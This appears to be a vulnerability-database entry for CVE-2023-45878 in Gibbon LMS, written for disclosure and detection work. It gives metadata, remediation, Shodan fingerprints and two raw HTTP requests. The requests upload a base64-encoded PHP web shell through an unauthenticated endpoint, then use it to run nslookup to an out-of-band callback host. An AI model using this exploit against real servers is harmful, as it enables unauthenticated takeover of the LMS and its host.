---
layout: post
cve_id: CVE-2023-45878
title: Gibbon LMS <= v25.0.01 - File Upload to RCE
pcap: true
pcap_path: /pcaps/2023/CVE-2023-45878.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2023/CVE-2023-45878.yaml
snort2_rule: N/A
snort3_rule: N/A
author: ajdumanhug
severity: critical
impact: 'Unauthenticated attackers can upload arbitrary PHP files through the rubrics_visualise_saveAjax
  endpoint to execute arbitrary code on the Gibbon LMS server, enabling complete application
  and server compromise.

  '
remediation: 'Fixed in v26.0.00; upgrade immediately, or restrict access to the vulnerable
  endpoint and implement WAF protection.

  '
reference:
- https://github.com/GibbonEdu/core/releases/tag/v26.0.00
- https://github.com/GibbonEdu/core/tree/16638b849220dd24ed1e536b44b76e222ae0f6c0
- https://nvd.nist.gov/vuln/detail/CVE-2023-45878
- https://herolab.usd.de/security-advisories/usd-2023-0025/
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
  cvss-score: 9.8
  cve-id: CVE-2023-45878
  epss-score: 0.92509
  epss-percentile: 0.99721
metadata:
  verified: true
  max-requests: 1
  vendor: gibbonedu
  product: gibbon
  shodan-query:
  - http.favicon.hash:-165631681
  - http.favicon.hash:"-165631681"
  fofa-query: icon_hash="-165631681"
tags:
- cve2023
- cve
- file-upload
- rce
- gibbonedu
- gibbon
- vkev
- vuln
---

## ðŸ” Vulnerability Description
Gibbon LMS versions 25.0.1 and earlier are vulnerable to an Arbitrary File Upload that can lead to Remote Code Execution (RCE). The issue stems from the rubrics_visualise_saveAjax.php endpoint, which, notably, does not require authentication. Because of this, unauthenticated attackers could potentially upload malicious PHP files and execute arbitrary code on the server.


## ðŸŒ HTTP Request
```nohighlight
POST /modules/Rubrics/rubrics_visualise_saveAjax.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:1.9.7.20) Gecko/ Firefox/3.6.11
Connection: close
Content-Length: 109
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip
img=image/png;EqblrUlS,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8%2b&path=EqblrUlS.php&gibbonPersonID=0000000001
```

```nohighlight
GET /EqblrUlS.php?cmd=nslookup+d5jlet9le0o4e22hs2qg9odjgknbkakqr.oast.site HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11) AppleWebKit/601.1.27 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/601.1.27
Connection: close
Accept-Encoding: gzip
```

